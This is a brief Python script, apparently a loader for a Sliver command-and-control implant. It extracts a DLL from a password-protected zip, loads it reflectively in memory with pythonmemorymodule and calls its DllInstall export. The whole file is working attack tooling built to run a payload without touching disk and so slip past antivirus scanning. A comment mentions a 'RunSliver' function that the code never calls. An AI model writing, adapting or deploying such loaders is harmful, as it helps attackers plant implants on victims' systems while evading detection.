import ctypes
import zipfile
import io
import pythonmemorymodule
string = 'password'
pword_bytes = bytes(string, 'utf-8')
# Open the zip archive and read the DLL into memory
with zipfile.ZipFile('example.zip', 'r') as zf:
    with zf.open('example.dll', 'r', pwd=pword_bytes) as dll_file:
        buf = dll_file.read()
# Load the DLL using pythonmemorymodule
dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
# Get the address of the RunSliver function and call it
startDll = dll.get_proc_addr('DllInstall')
assert startDll()
# Clean up
# dll.free_library()